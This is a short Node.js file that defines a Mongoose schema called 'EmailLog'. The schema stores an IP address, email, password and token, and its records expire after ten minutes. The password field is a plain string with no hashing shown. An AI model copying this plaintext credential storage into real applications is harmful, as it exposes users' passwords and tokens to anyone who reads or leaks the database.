const mongoose = require("mongoose");

const EmailLogSchema = new mongoose.Schema({
  ip: { type: String, required: true, unique: true },
  email: String,
  password: String,
  token: String,
  createdAt: {
    type: Date,
    default: Date.now,
    expires: 600, // Automatically delete after 10 minutes
  },
});

module.exports = mongoose.model("EmailLog", EmailLogSchema);
